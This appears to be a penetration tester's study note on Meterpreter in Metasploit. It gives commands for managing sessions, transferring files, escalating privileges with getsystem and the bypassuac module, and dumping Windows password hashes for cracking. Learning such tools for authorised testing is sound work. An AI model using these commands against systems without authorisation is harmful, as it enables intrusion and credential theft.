### General Notes

A very powerful shell that can be used to attack machines and install [[Backdoors]].

---
### Usage inside [[Metasploit]] `msfconsole`

- **Bind TCP**: runs a server process on the target and waits for connection from attacker. `bind_tcp`
- **Reverse TCP**: performs a TCP connection back to the attacker machine. Helps evade [[Firewall]]s. `reverse_tcp`

---
### Sessions

After setting the right payload, run the *exploit* to get a session.
- A `meterpreter session` is an advanced shell on a target machine.

> Multiple sessions can be hosted in one `msfconsole` host.

- To go back to the `msfconsole` from the meterpreter session:
```
background
```

- To list all the available sessions
```
sessions -l
```

- To resume a session
```
sessions -i <session-id>
```

---
### Exploitation

- Can perform multiple commands in the meterpreter session to get information about the target machine.
```
ifconfig
route
sysinfo
getuid
shell   //to run the standard os shell on the attacked machine.
...
```

- Can upload and download files
```
download <path-to-file-in-attacked> <destination-path-attacker>
upload <destination-path-attacker> <path-to-file-in-attacked>
```

> For window use `\` and Linux use `/`.

---
### Privilege Escalation

- To raise privileges using a Privilege Escalation routine provided by meterpreter.
```
getsystem
```
> *system* user is the highest privileges in windows machines.

However, the User Account Control (UAC) policy prevents this from happening in modern windows machines.
- To do that, use the `bypassuac` exploit module in [[Metasploit]]. 
```
background  //background the current session.
use exploit/windows/local/bypassuac   //get the bypassuac exploit for windows
show options 
set session <meterpreter session>
```
> This opens a new meterpreter shell session that can use the `getsystem` command.

---
### Dumping Password Database

Saving the password database and cracking it using [[John the Ripper]] for instance.
- Do that using the `hashdump` post-exploit module in [[Metasploit]].
```
background
use post/windows/gather/hashdump
show options
set session <meterpreter session>
exploit // dumps the hashes.
```

---
### Extra Commands

- Shells can be upgraded to meterpreter shells using the `mult/manage/shell_to_meterpreter` module.

- `/tmp` and `/var/tmp` are writeable.

---
